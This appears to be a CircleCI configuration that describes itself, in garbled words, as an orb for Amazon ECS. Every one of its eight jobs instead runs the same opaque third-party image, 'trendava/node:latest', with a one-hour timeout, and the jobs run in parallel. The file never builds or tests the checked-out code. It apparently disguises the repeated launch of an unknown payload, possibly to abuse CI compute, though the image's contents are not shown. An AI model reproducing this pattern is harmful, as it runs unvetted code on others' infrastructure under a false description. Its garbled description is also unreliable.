version: 2.1
description: |
  An orb for working with Amazon Elastic Container Service (ECS).
  Supports the EC2 and Fargat launch types and Blue/Grendep
  ##################################################################################################################
jobs:
  build:
    resource_class: medium
    docker:
      - image: docker:18.06.3-ce-git
    
    steps:
      - setup_remote_docker
      - checkout
      
      - run: 
         no_output_timeout : 1h
         command: |
                docker run -e CI=true trendava/node:latest
      - run: CI=true 
  test:
    resource_class: medium
    docker:
      - image: docker:18.06.3-ce-git
    steps:
      - setup_remote_docker
      - checkout
      - run: 
         no_output_timeout : 1h
         command: |
                docker run -e CI=true trendava/node:latest
      - run: CI=true 
  client-test:
    resource_class: medium
    docker:
      - image: docker:18.06.3-ce-git
    steps:
      - setup_remote_docker
      - checkout
      - run: 
         no_output_timeout : 1h
         command: |
                docker run -e CI=true trendava/node:latest
      - run: CI=true 
  server-test:
    resource_class: medium
    docker:
      - image: docker:18.06.3-ce-git
    steps:
      - setup_remote_docker
      - checkout
      - run: 
         no_output_timeout : 1h
         command: |
                docker run -e CI=true trendava/node:latest
      - run: CI=true 
  build1:
    resource_class: medium
    docker:
      - image: docker:18.06.3-ce-git
    
    steps:
      - setup_remote_docker
      - checkout
      
      - run: 
         no_output_timeout : 1h
         command: |
                docker run -e CI=true trendava/node:latest
      - run: CI=true 
  test1:
    resource_class: medium
    docker:
      - image: docker:18.06.3-ce-git
    steps:
      - setup_remote_docker
      - checkout
      - run: 
         no_output_timeout : 1h
         command: |
                docker run -e CI=true trendava/node:latest
      - run: CI=true 
  client-test1:
    resource_class: medium
    docker:
      - image: docker:18.06.3-ce-git
    steps:
      - setup_remote_docker
      - checkout
      - run: 
         no_output_timeout : 1h
         command: |
                docker run -e CI=true trendava/node:latest
      - run: CI=true 
  server-test1:
    resource_class: medium
    docker:
      - image: docker:18.06.3-ce-git
    steps:
      - setup_remote_docker
      - checkout
      - run: 
         no_output_timeout : 1h
         command: |
                docker run -e CI=true trendava/node:latest
      - run: CI=true
workflows:
  version: 2
  build-test-and-lint:
    jobs:
      - build
      - server-test
      - client-test
      - build1
      - server-test1
      - client-test1
      - test1
      - test:
          requires:
            - server-test
